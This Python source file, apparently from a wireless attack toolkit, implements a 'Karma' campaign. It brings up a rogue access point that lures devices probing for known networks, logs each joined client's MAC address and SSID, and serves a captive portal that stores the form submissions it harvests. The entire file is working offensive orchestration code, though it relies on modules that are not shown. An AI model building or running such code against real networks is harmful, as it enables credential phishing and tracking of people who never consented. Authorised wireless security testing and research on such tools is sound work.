"""KarmaCampaign: drives ``KarmaAP`` on one operator-picked interface/channel and (Linux, best
effort) captive-portals whoever joins, reusing EvilTwin's open-clone IP layer wholesale --
``PortalStack`` only ever cared about a BSSID + an SSID string, never about *which* attack put a
client on the TAP. Unlike ``EvilTwinCampaign`` there is no target ``AccessPoint`` at all (this is
launched from the Scanner, not a per-AP Focus panel) and no punting: Karma is entirely passive,
waiting for clients to volunteer themselves.
"""
from __future__ import annotations

import asyncio
import logging
import sys
import time
from typing import Optional

from wifit3.campaigns.campaign import Campaign
from wifit3.campaigns.eviltwin.portal import PortalStack
from wifit3.campaigns.karma.karma_ap import KarmaAP
from wifit3.net.portal_templates import PortalTemplate

logger = logging.getLogger(__name__)

_POLL_SEC = 0.25
# No single SSID applies to every joiner (each client may believe it joined a different named
# network), so the portal page itself stays generic.
GENERIC_PORTAL_SSID = "Wi-Fi"


class KarmaCampaign(Campaign):
    button_id = None            # launched from the Scanner: no target AP, so no Focus button
    key = "karma"
    idle_label = "Karma"
    run_label = "Stop Karma"
    idle_variant = "primary"
    run_variant = "error"

    def __init__(self, array, iface, channel: int,
                 portal_template: PortalTemplate = PortalTemplate.CLICKTHROUGH):
        super().__init__(ap=None, array=array)
        self._karma_iface = iface
        self.channel = channel
        self.portal_template = portal_template
        self.karma: Optional[KarmaAP] = None
        self.portal: Optional[PortalStack] = None
        self.ip_layer_error: Optional[str] = None
        self.portal_submissions: list[dict] = []       # harvested form submissions, newest last
        self.joined_clients: list[dict] = []            # {"mac", "ssid", "at"}, newest last

    @property
    def iface(self):
        """Explicitly operator-picked (there's no target AP to ``select_iface`` off of)."""
        return self._karma_iface

    async def _loop(self) -> None:
        self.karma = KarmaAP(self._karma_iface, self.channel, rx_source=self._karma_iface,
                             on_client_joined=self._on_client_joined)
        await self.karma.start()
        await self._start_ip_layer()
        while not self.stopped:
            await asyncio.sleep(_POLL_SEC)

    def _on_client_joined(self, mac: str, ssid: str) -> None:
        self.joined_clients.append({"mac": mac, "ssid": ssid, "at": time.time()})

    async def _start_ip_layer(self) -> None:
        """Best-effort, same contract as ``EvilTwinCampaign._start_ip_layer``: Karma still leaks
        probed SSIDs and collects associations even if this fails."""
        if not sys.platform.startswith("linux"):
            self.ip_layer_error = "no IP layer yet on this platform (Linux only for now)"
            return
        stack = PortalStack(self._karma_iface, self.karma.bssid, GENERIC_PORTAL_SSID,
                            template=self.portal_template, on_submit=self.portal_submissions.append)
        try:
            await stack.start()
        except Exception as exc:                                    # noqa: BLE001
            logger.warning("karma: IP layer did not come up: %s", exc)
            self.ip_layer_error = str(exc)
            return
        self.portal = stack

    async def teardown(self) -> None:
        if self.karma is None:
            return
        try:
            await self.karma.stop()
        finally:
            if self.portal is not None:
                await self.portal.stop()
